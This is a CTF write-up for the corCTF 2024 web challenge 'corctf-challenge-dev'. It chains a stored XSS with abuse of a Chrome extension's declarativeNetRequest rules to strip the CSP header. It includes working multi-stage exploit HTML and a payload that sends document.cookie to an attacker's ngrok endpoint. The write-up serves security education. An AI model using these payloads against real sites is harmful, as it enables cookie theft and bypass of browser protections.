---
title: "corctf-challenge-dev - corCTF 2024"
category: "web"
subcategory: "xss"
type: "writeup"
tags: ["web", "xss", "csp-bypass", "dom-xss", "base64", "headless-browser", "csp", "corctf", "corctf-2024", "2024", "ctf-writeup"]
summary: "corCTF is maintained by the Crusaders of Rust Team."
source:
  name: "CTFtime writeup #39390"
  url: "https://ctftime.org/writeup/39390"
original_source: "https://fireshellsecurity.team/corctf2024-challenge-dev/"
ctf:
  name: "corCTF 2024"
  year: 2024
  challenge: "corctf-challenge-dev"
---

## Metadata

- **CTF:** corCTF 2024
- **Task:** corctf-challenge-dev
- **Author team:** FireShell
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/39390>
- **Original writeup:** <https://fireshellsecurity.team/corctf2024-challenge-dev/>

---
![](https://i.imgur.com/Xs1Kflt.png)

corCTF is maintained by the [Crusaders of Rust](https://ctftime.org/team/132628/) Team. The 2024 edition happened between 27/07/2024 and 29/07/2024.

As usual, this was a great CTF with some really hard challenges. Although we couldn’t get this one in time for the CTF, we ([Neptunian](https://x.com/NeptunianHacks) & [Macmod](https://x.com/MacmodSec)) solved it a few days later, and we thought since it was such a fun challenge it deserved a writeup.

## The Challenge

**Author** : Drakon ![](https://i.imgur.com/kjeOdbD.png)

```
    fizzbuzz keeps pinging me to make challenges, but im too busy! can you make one for me and get him off my back?
```

## Stored XSS

We quickly figured out that there was a stored XSS in the `challenges` route, as we could send a POST to `/create` with arbitrary HTML to be registered in both the challenge title and its description:

```
     # routes/api.js
     56 router.post("/create", requiresLogin, (req, res) => {
     57     let { title, description } = req.body;
     58     if (!title || !description || typeof title !== "string" || typeof description !== "string") {
     59         return res.json({ success: false, error: "Missing title or description" });
     60     }
     61
     62     req.user.challenges.push(db.addChallenge({title: title, description: description}));
     63
     64     res.json({ success: true });
     65 });
```

We also noticed in the source code that there was a `/submit` route that we could use to supply an arbitrary URL (such as a challenge link or another URL under our control), and a bot would apparently try to access it (`bot.visit(url)`):

```
     # index.js
     75 app.get("/submit", requiresLogin, (req, res) => {
     76     const { url } = req.query;
     77
     78     if (!url || typeof url !== "string") {
     79         return res.send('missing url');
     80     }
     81
     82     const urlObj = new URL(url);
     83     if (!['http:', 'https:'].includes(urlObj.protocol)) {
     84         return res.send('url must be http/https')
     85     }
     86
     87     bot.visit(url);
     88     res.send('the admin will visit your url soon');
     89 });
```

We knew from previous challenges that this was a common approach in XSS challenges - there is usually a bot that will access your page in a headless browser, and your goal is typically to trigger the XSS and steal some information from the bot, like a cookie, a query parameter, or values from localStorage.

This was indeed confirmed - as we looked into `bot/bot.js`, we noticed that it would try to access the URL with the `flag` loaded in a cookie:

```
    # bot/bot.js
    29         page.evaluate((flag) => {
    30             document.cookie = "flag=" + flag;
    31         }, FLAG);
```

## Blocked by CSP!

Although XSS was possible, _no browser would ever execute it_ , since the site also had this `Content-Security-Policy` (CSP) set up in `index.js`:

```
    # index.js
    30     const nonce = crypto.randomBytes(16).toString('base64');
    31     res.setHeader(
    32         "Content-Security-Policy",
    33         `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`
    34     );
```

The `Content-Security-Policy` is a header that can be supplied by a site specifying restrictions that the client’s browser must consider before allowing the execution of scripts or the inclusion of images, fonts or other _resource types_ by the site being accessed. As you can imagine, specifying a CSP is great way to prevent XSS from effectively running, even though your app might be “vulnerable”.

The CSP header specifies a _CSP policy_ \- a set of _policy directives_ separated by `;`. Each _policy directive_ describes the restrictions in place for a specific _resource type_.

In our case, the CSP was: `base-uri 'none'; script-src 'nonce-${nonce}'; img-src *; font-src 'self' fonts.gstatic.com; require-trusted-types-for 'script';`

We guessed most of these restrictions were useless for the purposes of the challenge, but the real issue was `script-src 'nonce-${nonce}'`, which specifies that the browser should only execute scripts if their `<script>` tag has a `nonce` attribute with a _specific nonce_ that was previously generated by the server:

```
    # index.js
    30 const nonce = crypto.randomBytes(16).toString('base64');
```

We had no way of guessing this nonce beforehand, as it was made from 16 random bytes, which meant in normal conditions we wouldn’t be able to exploit the XSS.

We also initially thought that `require-trusted-types-for 'script';` might pose another problem for us, as it’s a directive that [“locks down” common vectors for DOM XSS](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API).

Since the `script-src` problem was a much bigger one and we didn’t have any DOM XSS in mind, we didn’t give much attention to this issue and continued to analyze the app.

## Extension X-Ray

The app was pretty much just a CRUD app for “CTF challenges”; the only aspect that intrigued us was that the bot’s browser was loading a custom Chrome extension, so we imagined exploiting this extension to bypass the CSP had to be part of the solution:

```
      # bot/bot.js
      8 const ext = path.resolve(__dirname, "./extension/");
      9
     10 const visit = async (url) => {
     11     let browser;
     12     try {
     13         browser = await puppeteer.launch({
     14             headless: "new",
     15             pipe: true,
     16             args: [
     17                 "--no-sandbox",
     18                 "--disable-setuid-sandbox",
     19                 `--disable-extensions-except=${ext}`,
     20                 `--load-extension=${ext}`
     21             ],
     22             dumpio: true
     23         });
```

We had the source of the extension (`FizzBlock101`), so we started analyzing it and found some interesting pieces:

```
    # bot/extension/manifest.json
    {
      "manifest_version": 3,
      "name": "FizzBlock101",
      "description": "Mandatory CoR management extension. Blocks subversive, unpatriotic elements.",
      "version": "1.0",
      "action": {
        "default_icon": "fizzbuzz.png"
      },
      "permissions": [
        "storage",
        "tabs",
        "declarativeNetRequest"
      ],
      "host_permissions": [
            "<all_urls>"
      ],
      "background": {
          "service_worker": "js/request_handler.js"
      },
      "content_scripts": [
        {
              "js": [
                    "js/lodash.min.js",
                    "js/form_handler.js"
              ],
              "css": [
                "css/modal.css"
              ],
              "matches": [
                "<all_urls>"
              ]
            }
      ]
    }
```

Apparently the extension was aimed at “blocking requests”, and required an interesting permission (`declarativeNetRequest`).

We can think of [declarativeNetRequest](https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest) as a kind of _Chrome Request Filter_ , where you can manipulate requests and responses. It seems “a bit” like [Ettercap](https://github.com/Ettercap/ettercap), but on a browser context.

When starting, it creates some basic rules like the example rules below, which gives us some idea of what it is doing:

```
    {
    	"action": { // fizzbuzz hates microsoft!
    		"type": "block",
    		"redirect": {},
    		"responseHeaders": [],
    		"requestHeaders": []
    	},
    	"condition": {
    		"initiatorDomains": ["corctf-challenge-dev.be.ax"],
    		"resourceTypes": ['image', 'media', 'script'],
    		"urlFilter": "https://microsoft.com*"
    	}
    }
```

In this case, it blocks requests starting with `https://microsoft.com`, if the requested object is initiated in the domain `corctf-challenge-dev.be.ax`, and is in the 3 restricted resource types defined.

The extension creates a button `Open block settings` on every page (of every domain), which opens the form below, so we can also add customized rules.

![](https://i.imgur.com/ZfuTgmZ.png)

This form does not add the new rule directly. It just stores the rule to be added, but more on that later.

## Bypassing CSP

At first we had no idea where to go from here, but Neptunian googled a little bit and found [this StackOverflow question](https://stackoverflow.com/questions/72186787/chrome-extensions-and-csp) which described a promising technique for CSP bypass using this `declarativeNetRequest` thing to to **to modify request headers or response headers, and even to _remove_ existing response headers**.

![](https://i.imgur.com/JTW1vYw.gif)

We thought that it was somehow possible to “force” the extension into running `chrome.declarativeNetRequest.updateDynamicRules`, passing rules under our control to be registered in the browser.

If this was possible, we could probably add a rule to _remove the CSP header from every HTTP response_ and then reload the page, or redirect it to our challenge link with the XSS payload.

Indeed there was a code path in the extension that called this function, and it was present in a background [service worker](https://developer.chrome.com/docs/workbox/service-worker-overview) of the extension, which was running in background on _all pages_ accessed by the bot:

```
    # bot/extension/js/request_handler.js
    chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
            if (changeInfo.status == 'loading' && tab.url.indexOf(tab.index > -1)) {
                    const origin = (new URL(tab.url)).origin;
                    registerRules(origin);
            }
    });
    
    const registerRules = (url) => {
            chrome.storage.local.get(url).then((data) => {
                    const arr = data[url];
                    if (arr != null) {
                            for (let i = 0; i < arr.length; i++) {
                                    const rule = arr[i];
                                    rule['id'] = i+1;
                                    chrome.declarativeNetRequest.updateDynamicRules({
                                            addRules: [
                                                    rule
                                            ],
                                            removeRuleIds: [i+1]
                                    });
                            }
                    }
            });
    };
```

Even if we could trigger this method somehow, it seemed to get the “rules to add” from the [storage of the extension](https://developer.chrome.com/docs/extensions/reference/api/storage) as seen in “`chrome.storage.local.get(url)`”. Therefore, at this point we needed 4 things:

  1. Create a malicious challenge in the app with a script that steals the`flag` cookie by sending a `fetch` with it to a webserver under our control.
  2. A way to poison the storage of the extension with a malicious dynamic rule to be added to the browser.
  3. A way to trigger `registerRules` after that, effectively adding the rules from the storage of the extension into the browser.
  4. A way to redirect to our malicious challenge.


One and four were easy and three seemed to be a “relatively simple” as we just had to make sure that `changeInfo.status == 'loading' && tab.url.indexOf(tab.index > -1)` would evaluate to `true`.

`chrome.tabs.onUpdated` would probably be called as soon as the bot opened our malicious page, and `tab.url` was under our control.

At first we thought that we needed to redirect the bot to something like `ChallengeURL` \+ `#true` to have `tab.url.indexOf(tab.index > -1)` evaluate to `true`, since `tab.index > -1` always evaluates to `true` and `indexOf` expects a string, but as it turns out Javascript is dumb and, even if `indexOf` returns `-1` because it could not find the string “true” in the URL, `-1` is still considered `true`, so this condition was not a problem at all and we just had to reload the malicious page to trigger `onUpdated`.

Keep in mind that our goal was to craft a malicious page that would do steps 2, 3 and 4 in the same browser session (with a single call to `/submit`), as we imagined it was possible that the bot’s browser didn’t keep the rules from previous executions.

## Some obscure JavaScript scopes

The missing bit was step 2. To be able to poison the storage of the extension we’d need to call `chrome.storage.local.set()`, and there was only one reference to that function in the extension apart from the one in `bot/extension/js/request_handler.js`:

```
      # bot/extension/js/form_handler.js
      1 const origin = window.location.origin;
      2
      3 const base_rule = {
      4     "action": {
      5         "type": "block",
      6         "redirect": {},
      7         "responseHeaders": [],
      8         "requestHeaders": []
      9     },
     10     "condition": {
     11         "initiatorDomains": [origin],
     12         "resourceTypes": ['image', 'media', 'script']
     13     }
     14 };
     15
     16 function serializeForm(items) {
     17     const result = {};
     18     items.forEach(([key, value]) => {
     19         const keys = key.split('.');
     20         let current = result;
     21         for (let i = 0; i < keys.length - 1; i++) {
     22             const k = keys[i];
     23             if (!(k in current)) {
     24                 current[k] = {};
     25             }
     26             current = current[k];
     27         }
     28         current[keys[keys.length - 1]] = isNaN(value) ? value : Number(value);
     29     });
     30
     31     return result;
     32 }
     ...
     55 modal.querySelector('#submit-btn').addEventListener('click', async () => {
     56     const obj = serializeForm(Array.from(new FormData(document.getElementById('block-options'))));
     57     const merged_obj = _.merge(base_rule, obj);
     58
     59     chrome.storage.local.get(origin).then((data) => {
     60         let arr = data[origin];
     61         if (arr == null) {
     62             arr = [];
     63         }
     64         arr.push(merged_obj);
     66         chrome.storage.local.set(Object.fromEntries([[origin, arr]]));
     67     });
     68 });
```

From the manifest, we knew that the `form_handler.js` was not a service worker, but a [content script](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts). It has access to the DOM of the page and its function is to add a button to the page that, when clicked, shows this “block this page” modal.

![](https://i.imgur.com/ZfuTgmZ.png)

This modal has a “submit” button that, when clicked, will get the rules to be stored from the form (id `block-options`), and store them in the extension’s storage, using the `window.location.origin` as the key.

It would be something like this:

```
    {
        "http://localhost:8080": [
    		{
    			"action": {
    				"type": "block"
    			},
    			"condition": {
    				"initiatorDomains": ["domain1", "domain2"],
    				"resourceTypes": [
    					"main_frame",
    					"sub_frame",
    					"script"
    				]
    			},
    			"id": 1,
    			"priority": 1
    		},
    		{
    			"action": {
    				"type": "block"
    			},
    			"condition": {
    				"initiatorDomains": ["domain3", "domain4"],
    				"resourceTypes": [
    					"main_frame",
    					"script"
    				]
    			},
    			"id": 2,
    			"priority": 5
    		}
    	]
    }
```

One important thing to know is that the extension’s storage is **not the same as the localStorage of the application** , and as far as we can tell it’s only visible from the extension itself. The extension’s storage is commonly referred as the [Storage API](https://developer.chrome.com/docs/extensions/reference/api/storage?hl=pt-br), while the localStorage is usually called the [Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Storage).

This is the same key that’s used by `registerRules` when a tab is updated to get the rules from the extension’s storage and then register them in the browser.

We can forge this _block domain form_ (the one that contains the rule to be added) when crafting our malicious page and then write some Javascript to call the click handler on the submit button that the extension inserts into our page.

Notice that our malicious page will not be restricted by the CSP since it will be at a different domain, but won’t receive the flag from a cookie either, since the flag cookie will be scoped to the challenge’s domain (`http://localhost:8080`)

Our goal is to simply use it to disable the CSP from the browser and then force a redirect to the malicious challenge created before.

![steps12](https://i.imgur.com/0bDLClc.png)

After clicking the button, the extension will get the new rule from the `block-options` form, pass it through the `serializeForm` function to turn it into a Javascript object, and append the rule into the `origin` key of its’ storage.

```
    function serializeForm(items) {
        const result = {};
        items.forEach(([key, value]) => {
            const keys = key.split('.');
            let current = result;
            for (let i = 0; i < keys.length - 1; i++) {
                const k = keys[i];
                if (!(k in current)) {
                    current[k] = {};
                }
                current = current[k];
            }
            current[keys[keys.length - 1]] = isNaN(value) ? value : Number(value);
        });
    
        return result;
    }
```

Afterwards, we should be able to reload the page, triggering the extension’s `registerRules` function to have the rules actually registered in the browser.

![step3](https://i.imgur.com/cDNIGVu.png)

Then we can perform our redirect:

![step4](https://i.imgur.com/zikQdHU.png)

Notice that the `origin` which is the key that is used to get the rules from the extension’s storage is always going to be our malicious page throughout the exploit chain. Because of this, the fact that we are doing this from a different domain doesn’t matter (we were fooled by this “origin key” thing at first, thinking it posed some sort of limitation to the exploit, which wasn’t the case).

## One Form to rule them all

The interesting thing about `serializeForm`, is that it does not validate the contents of the form, it just serializes whatever is in it, allowing us to create custom JSON data if we could tamper with the form or override it with our own.

Since we were the ones crafting a malicious page to be sent to the bot, nothing stopped us from writing the rule to remove the CSP header into the form with `id="block-options"`, waiting a little bit, and then clicking the button inserted by the extension. Something like this:

```
    <form id="block-options">
        <fieldset>
        <input type='hidden' id='priority' name='priority' value='1'>
        <input type='hidden' id='action' name='action.type' value='modifyHeaders'>
        <input type='hidden' id='removeCSP' name='action.responseHeaders.header' value='Content-Security-Policy'>
        <input type='hidden' id='operation' name='action.responseHeaders.operation' value='remove'>
        </fieldset>
    </form>
    <script>
        setTimeout(() => {
            document.querySelector("#submit-btn").click();
        }, 1000);
    </script>
```

The issue was that the extension always added _their form_ before ours. If two elements have the same `id`, `document.getElementById('block-options')` will always get the first one, so in order to poison the storage of the extension we had to move our element and place it before the “official” one:

```
        <form id="block-options2">
        <fieldset>
            <input type='hidden' id='priority' name='priority' value='1'>
            <input type='hidden' id='action' name='action.type' value='modifyHeaders'>
            <input type='hidden' id='removeCSP' name='action.responseHeaders.header' value='Content-Security-Policy'>
            <input type='hidden' id='operation' name='action.responseHeaders.operation' value='remove'>
        </fieldset>
        </form>
    
        <script>
            setTimeout(() => {
                const originalElement = document.getElementById('block-options2');
    
                const clone = originalElement.cloneNode(true);
    
                clone.id = 'block-options';
    
                document.body.insertBefore(clone, document.body.childNodes[0]);
    
                document.querySelector('#submit-btn').click();
    
                // And now what??
    
            }, 1000);
        </script>
```

The plan made sense, but it just didn’t work. We had to work deeper in the simulation to understand what was happening.

## Chrome Extension Lab for dummies

To properly test what we wanted, we had to simulate it in our chrome.

First of we started by installing the extension, which is quite easy. By using the `chrome://extensions/` configuration page, we just click `Load unpacked` and select the challenge extension directory.

![](https://i.imgur.com/dJgNqVA.png)

After that, the extension is loaded.

![](https://i.imgur.com/6ISHMTy.png)

If we click on `service worker`, we get the Developer Tools console of the extension.

![](https://i.imgur.com/74bbwV1.png)

It looked like we didn’t have much access here. But it made it so MUCH easier to test the `declarativeNetRequest` rules directly on the extension console.

At first we checked that the rule list was empty by calling `await chrome.declarativeNetRequest.getDynamicRules();` which returned an empty array `[]`.

Then we set up our very simple XSS payload, to send the cookies to our ngrok endpoint:

```
    Flaginator
    <script>
        fetch("https://e8a5-201-17-122-29.ngrok-free.app/flag?flag="+encodeURIComponent(document.cookie), {
            "method": "GET",
            "mode": "no-cors"
        });
    </script>
```

Before testing any fancy rules, we check the CSP behaviour of chrome, while rendering our payload.

![](https://i.imgur.com/jeT00w9.png)

As expected, we were blocked by CSP. Let’s now try to remove the CSP (manually for now), using our new trick 😈

```
    var myrules = [
        {
            "action": {
                "responseHeaders": [
                    {
                        "header": "Content-Security-Policy",
                        "operation": "remove"
                    }
                ],
                "type": "modifyHeaders"
            },
            "condition": {
                "initiatorDomains": ["localhost"],
                "resourceTypes": [
                    "main_frame",
                    "sub_frame",
                    "script"
                ]
            },
            "id": 1,
            "priority": 100
        }
    ];
    	
    await chrome.declarativeNetRequest.updateDynamicRules({
    	addRules: myrules,
    	removeRuleIds: [1,2,3,4,5,6,7]
    });
```

After adding the rule, we check that the rule was actually saved.

```
    await chrome.declarativeNetRequest.getDynamicRules();
```

And it is saved:

![](https://i.imgur.com/3SOkEzy.png)

When testing it again, we do not get the error and something pops in our ngrok endpoint.

![](https://i.imgur.com/M716I3y.png)

I saved `fireshell{0wneeeeeeeeeeed}` on my `http://localhost:8080` chrome origin, just to feel the vibe.

Now we had to do this process automatically. Us vs. Bot.

![](https://i.imgur.com/xW6f3hd.gif)

## Breaking and Entering

For this, we first clean the rules and also the extension storage.

```
    var origin = 'http://localhost:8080';
    chrome.storage.local.set(Object.fromEntries([[origin, []]]));
```

Following the original plan, let’s create the payload, which will (reminder):

  1. Serve from our controlled domain (free from CSP).
  2. Use JavaScript to add our poisoned form to the beginning of the page, to be serialized in the desired JSON rule - it only saves the rule in the extension storage.
  3. Reload the page, to fire the onTabUpdated serviceWorker event, to actually register the rule.
  4. Redirect to our XSS challenge page, which now should be able to leak the cookie from `http://localhost:8080`.


Our malicious first-stage payload looks like this:

```
    <html>
        <body>
    
            FireShell was here!
    
            <form id="block-options2">
                <fieldset>
                    <input type='hidden' id='priority' name='priority' value='110'>
                    <input type='hidden' id='action' name='action.type' value='modifyHeaders'>
                    <input type='hidden' id='iniDomain' name='condition.initiatorDomains.0' value='localhost'>
                    <input type='hidden' id='resType' name='condition.resourceTypes.0' value='main_frame'>
                    <input type='hidden' id='removeCSP' name='action.responseHeaders.0.header' value='Content-Security-Policy'>     
                    <input type='hidden' id='operation' name='action.responseHeaders.0.operation' value='remove'>
                </fieldset>
            </form>
    
            <script>
    
                setTimeout(() => {
                    // Clone the "#block-options2" element 
                    // containing the malicious rule into
                    // a "#block-options" the beginning of the body
                    // (before the one inserted by the extension)
                    const originalElement = document.getElementById('block-options2');
                    const clone = originalElement.cloneNode(true); // true to clone all descendants
                    clone.id = 'block-options';
    
                    document.body.insertBefore(clone, document.body.childNodes[0]);
                    
                    // Force the click on the button to
                    // insert the malicious rule into the storage
                    // of the extension
                    document.querySelector('#submit-btn').click();
    
                    setTimeout(()=>{
                        // Attempt to force the call
                        // chrome.tabs.onUpdated => registerRules
                        // to set the malicious rule to remove the CSP
                        // from subsequent responses
                        window.location.href = window.location.href+'#x';
    
                        // Redirect to the stored XSS :-)
                        setTimeout(()=>{
                            window.location.href = 'http://localhost:8080/challenge/0eb69cb61a8a';
    
                        }, 1200);
                        
                    },1200);
    
                    
                }, 1200);
    
            </script>
    
        </body>
    </html>
```

We also added a bunch of `console.log`’s to get more information of what is actually hapening on the extension.

While testing, our serviceWorker pops an error:

![](https://i.imgur.com/5DTGtBa.png)

This error did not happen while calling it manually. When automating the exploit with the extension, it merges our serialized rule object with this “template”:

```
    const base_rule = {
    	"action": {
    		"type": "block",
    		"redirect": {},
    		"responseHeaders": [],
    		"requestHeaders": []
    	},
    	"condition": {
    		"initiatorDomains": [origin],
    		"resourceTypes": ['image', 'media', 'script']
    	}
    };
```

We had to add some sort of data into the `action.requestHeaders` key of the rule to avoid the error, so we just included an action to remove an arbitrary **request header** (`abc`). Since this was a merge operation, there was no way to instruct the Javascript to “remove” an existing key from the template, only to override it:

```
    <input type='hidden' id='iniDomain3' name='action.requestHeaders.0.header' value='abc'>
    <input type='hidden' id='iniDomain4' name='action.requestHeaders.0.operation' value='remove'>
```

OK! Let’s run in the browser and get the flag, right??? We opened a new tab with our external 1st stage payload (`inject_rules.html`) and…

```
    Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-ND53pfxmyBgUJag7M+HQIQ=='". Either the 'unsafe-inline' keyword, a hash ('sha256-2oZ5MWU1xmCfWZX6CPQawmrO/6ZxyyfBcqBXoP5b0AA='), or a nonce ('nonce-...') is required to enable inline execution.
```

Blocked again. At this point it took us a long time to find out the rules simply don’t work in any scenario. If we just paste the URL of the challenge in the browser, the rule does not work. But if we navigate _between the pages_ , clicking in the XSS link, it works.

So, we created a 2nd-stage challenge payload, which just redirects to the 3rd and final stage, the XSS.

```
    <!-- http://localhost:8080/challenge/0eb69cb61a8a -->
    Redir
    <meta http-equiv="refresh" content="2;URL='http://localhost:8080/challenge/521319e318df'">
```

We now have 2 “challenges”:

  * `0eb69cb61a8a` -> Redirect
  * `521319e318df` -> XSS Leaker


And then we change our first stage external payload, to go to this redirect.

```
    window.location.href = 'http://localhost:8080/challenge/521319e318df';
```

Now, we try again, and receive a gift on the ngrok:

![](https://i.imgur.com/gNbP0iC.png)

XSS achieved!

Let’s try our local bot, with the `/submit` endpoint: `http://localhost:8080/submit?url=https://bb00-201-17-122-29.ngrok-free.app/inject_rules.html`

![](https://i.imgur.com/LFQ1BWJ.png)

Let’s knock the server now!

![](https://i.imgur.com/f15LGE1.png) **Owned!**

```
    corctf{i_was_going_to_find_a_bug_in_ublock_but_it_was_easier_to_just_write_my_own_broken_extension}
```

![](https://i.imgur.com/hGS5ZjW.jpg)

# Weird behaviors

We also spent a long time trying to understand why is it that DevTools doesn’t show the modified request and response headers consistently across different types of navigations. From what we could gather, the way DevTools shows request/response headers depends on whether the request came from a `<meta>` redirect or a `window.open()` / `location.href override`. Even though the headers might have been successfully modified, what you see is not what you actually get and we couldn’t figure out a simple way to troubleshoot whether the rules were really being applied without just running the full chain :eyes:

## References

  * [Macmod](https://x.com/MacmodSec)
  * [Neptunian](https://x.com/NeptunianHacks)
  * [Crusaders of Rust](https://ctftime.org/team/132628/)
  * [declarativeNetRequest](https://developer.chrome.com/docs/extensions/reference/api/declarativeNetRequest)
  * [Trusted Types](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
  * [Service Worker Overview](https://developer.chrome.com/docs/workbox/service-worker-overview)
  * [Content Scripts](https://developer.chrome.com/docs/extensions/develop/concepts/content-scripts)
  * [StackOverflow question - Bypass CSP with extension](https://stackoverflow.com/questions/72186787/chrome-extensions-and-csp)
  * [Storage of the Extension](https://developer.chrome.com/docs/extensions/reference/api/storage)
  * Team: [FireShell](https://fireshellsecurity.team/)
  * [Team Twitter](https://twitter.com/fireshellst)


__[Capture the Flag](https://fireshellsecurity.team/ctf/) , [Web](https://fireshellsecurity.team/web/) , [Writeup](https://fireshellsecurity.team/writeup/)
